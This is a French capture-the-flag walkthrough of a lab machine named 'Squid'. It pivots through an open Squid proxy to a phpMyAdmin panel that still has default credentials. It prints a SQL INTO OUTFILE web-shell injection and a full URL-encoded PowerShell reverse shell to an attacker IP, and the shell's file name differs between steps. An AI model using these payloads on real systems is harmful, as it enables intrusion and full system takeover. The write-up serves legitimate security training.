# Squid

    sudo nmap -p- -sV -T5 192.168.205.189
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.205.189 --tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.205.189
Scans classiques.    
 
    3128/tcp open http-proxy Squid http proxy 4.14  
    |_http-title: ERROR: The requested URL could not be retrieved  
    |_http-server-header: squid/4.14

Seul le port 3128 semble ouvert. Le piège est qu'il ne faut pas se casser les dents à énumérer le port 3128 comme une cible, mais l'utiliser comme un proxy vers les autres services de la VM. 

    sudo vim /etc/proxychains4.conf
Ajouter "http 192.168.205.189 3128" et commenter les autres lignes.

    proxychains nmap --top-ports=300 -sV -T5 -sT --max-retries=1 192.168.205.189 -oN  Squid.txt
    nmap -sV --top-ports=300 -Pn -n -T5 -v --max-retries=1 --proxies http://192.168.205.189:3128 192.168.205.189

Voici deux exemples de scans que j'ai testés sans succès, les ports refusent ou ignorent ma connexion à chaque fois. J'ai voulu forcer dans cette voie en n'utilisant que Nmap mais apparemment il faut utiliser un autre outil spécifique capable de scanner à travers un proxy HTTP : https://github.com/aancw/spose

    $ python3  ~/Downloads/spose/spose.py  --proxy http://192.168.205.189:3128 --target 192.168.205.189
    Using proxy address http://192.168.205.189:3128  
    192.168.205.189 3306 seems OPEN  
    192.168.205.189 8080 seems OPEN

Passer par le navigateur avec une extension de gestion des proxies pour continuer sans trop s'embêter. On peut accéder au site sur http://192.168.205.189:8080/ en spécifiant le proxy 192.168.205.189:3128, type HTTP. Ce dernier point est très important, la connexion au site ne fonctionnera pas si on se trompe de protocole et que l'on passe par un SOCKS4 ou un SOCKS5.

En utilisant le mot de passe par défaut de phpMyAdmin ("root" / "") on peut se connecter au dashboard d'administration. On a maintenant un bien plus grand nombre de possibilités. 
<br /> Sur la page http://192.168.205.189:8080/phpmyadmin/sql.php on peut exécuter des requêtes MySQL, ce qui donne la possibilité d'injecter un web-shell :

    SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:/wamp/www/shell.php"

En visitant la page http://192.168.205.189:8080/backdoor.php?cmd=whoami on a bien le résultat de la commande :
> nt authority\system

Visiblement on est déjà au maximum des droits, il suffit donc de transformer ce web-shell en reverse-shell pour terminer la VM. Je vais utiliser l'un des shells du site https://www.revshells.com/ avec encodage : 

    rlwrap nc -nvlp 9001

En ouvrant l'adresse finale j'obtiens bien la connexion au serveur : 
http://192.168.205.189:8080/backdoor.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27192.168.45.184%27%2C9001%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

	PS C:\wamp\www> type C:\local.txt
    PS C:\wamp\www> dir C:\Users\Administrator\Desktop
    PS C:\wamp\www> type C:\Users\Administrator\Desktop\proof.txt

